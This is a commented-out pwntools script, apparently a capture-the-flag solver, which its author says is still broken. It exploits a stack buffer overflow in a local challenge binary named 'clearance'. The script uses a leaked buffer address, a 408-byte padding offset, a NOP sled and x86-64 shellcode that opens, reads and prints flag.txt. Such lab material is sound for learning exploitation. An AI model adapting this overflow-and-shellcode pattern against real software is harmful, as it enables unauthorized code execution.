# from pwn import *

# THE SOLVER IS STILL BROKEN, BUT I CAN'T BE BOTHERED TO FIX IT RN. SORRY :(

# context.arch = 'amd64'

# def solve():
#     binary = './clearance'
#     p = process(binary)

#     shellcode = asm('''
#         /* sys_open("flag.txt", O_RDONLY) */
#         lea rdi, [rip + flag_str]
#         xor rsi, rsi
#         mov rax, 2
#         syscall

#         /* sys_read(fd, rsp, 100) */
#         mov rdi, rax
#         mov rsi, rsp
#         mov rdx, 100
#         xor rax, rax
#         syscall

#         /* sys_write(1, rsp, rax) */
#         mov rdx, rax
#         mov rdi, 1
#         mov rsi, rsp
#         mov rax, 1
#         syscall

#         /* sys_exit(0) */
#         xor rdi, rdi
#         mov rax, 60
#         syscall

#         flag_str:
#             .string "flag.txt"
#     ''')

#     try:
#         p.recvuntil(b"Request ID: ")
#         buf_addr = int(p.recvline().strip(), 16)
        
#         offset = 408
        
#         payload = b"A" * offset
#         payload += p64(buf_addr + offset + 8) 
#         payload += b"\x90" * 64
#         payload += shellcode

#         p.sendlineafter(b"Submit clearance request:", payload)
        
#         print(p.recvall(timeout=2).decode(errors='ignore'))
        
#     except EOFError:
#         pass
#     finally:
#         p.close()

# if __name__ == "__main__":
#     solve()